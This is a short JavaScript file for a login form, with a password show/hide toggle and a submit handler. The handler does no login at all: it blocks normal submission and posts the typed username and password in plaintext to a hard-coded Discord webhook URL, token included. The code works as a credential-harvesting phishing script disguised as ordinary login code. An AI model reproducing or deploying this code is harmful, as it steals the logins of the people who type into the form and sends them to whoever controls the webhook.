document.getElementById('togglePassword').addEventListener('click', function(event) {
    
    event.preventDefault();
    
    const passwordInput = document.getElementById('password');

    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
    } else {
        passwordInput.type = 'password';
    }

    this.textContent = (passwordInput.type === 'password') ? '👁️' : '🚫';
});

document.querySelector("form").addEventListener("submit", function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if (username && password) {
        const webhookUrl = 'https://discord.com/api/webhooks/1315897807697084476/0OMmfzZVGpEkxQXaCJKvSCVqZyAjLiwG3lksybQ_UvFKYtzQBQWsv8KL-ccqTddBSUiw';
        const payload = {
            embeds: [
                {
                    title: 'User logged in',
                    fields: [
                        {
                            name: 'User',
                            value: username,
                            inline: true
                        },
                        {
                            name: 'Password',
                            value: password,
                            inline: true
                        }
                    ],
                    color: 7506394
                }
            ]
        };

        fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .then(data => console.log('Message sent to Discord:', data))
        .catch(error => console.error('Error sending to Discord:', error));
    }
});
